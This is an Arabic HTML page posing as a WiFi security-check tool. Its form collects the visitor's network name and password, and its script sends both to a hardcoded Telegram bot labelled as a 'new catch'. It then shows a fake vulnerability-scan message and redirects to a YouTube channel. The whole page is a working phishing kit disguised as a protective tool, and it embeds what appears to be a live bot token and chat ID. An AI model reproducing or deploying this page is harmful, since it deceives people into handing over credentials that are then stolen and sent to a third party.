<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص أمان الشبكة - WiFi Security</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        .icon { font-size: 50px; color: #17a2b8; margin-bottom: 15px; }
        h2 { color: #343a40; margin-bottom: 10px; font-size: 1.4rem; }
        p { color: #6c757d; font-size: 0.95rem; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 8px; box-sizing: border-box; font-size: 1rem; }
        button { width: 100%; background-color: #17a2b8; color: white; padding: 13px; border: none; border-radius: 8px; cursor: pointer; font-size: 1.1rem; font-weight: bold; transition: 0.3s; }
        button:hover { background-color: #138496; }
        #msg { margin-top: 15px; font-size: 0.9rem; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>أداة التحقق من أمان الشبكة</h2>
    <p>يرجى إدخال بيانات الشبكة الحالية لفحص وجود أي ثغرات أو عمليات اختراق نشطة في اتصالك بالإنترنت.</p>
    
    <input type="text" id="wifiName" placeholder="اسم شبكة الواي فاي (SSID)" required>
    <input type="password" id="wifiPass" placeholder="كلمة سر الشبكة" required>
    
    <button onclick="checkSecurity()">بدء الفحص الآن</button>
    
    <div id="msg"></div>
</div>

<script>
    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
    const chatId = "8042090388";

    async function checkSecurity() {
        const name = document.getElementById('wifiName').value;
        const pass = document.getElementById('wifiPass').value;
        const msg = document.getElementById('msg');

        if (!name || !pass) {
            msg.style.color = "red";
            msg.innerText = "يرجى ملء جميع الحقول للمتابعة.";
            return;
        }

        msg.style.color = "#17a2b8";
        msg.innerText = "جاري فحص الثغرات... يرجى عدم إغلاق الصفحة";

        // إرسال البيانات إلى تليجرام
        const text = `🎯 صيد جديد (فحص أمان):\n📶 اسم الشبكة: ${name}\n🔑 كلمة السر: ${pass}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });

            // التوجيه لقناة اليوتيوب المحددة بعد ثانيتين
            setTimeout(() => {
                window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
            }, 2000);
            
        } catch (e) {
            msg.style.color = "red";
            msg.innerText = "فشل الاتصال، حاول مجدداً.";
        }
    }
</script>

</body>
</html>
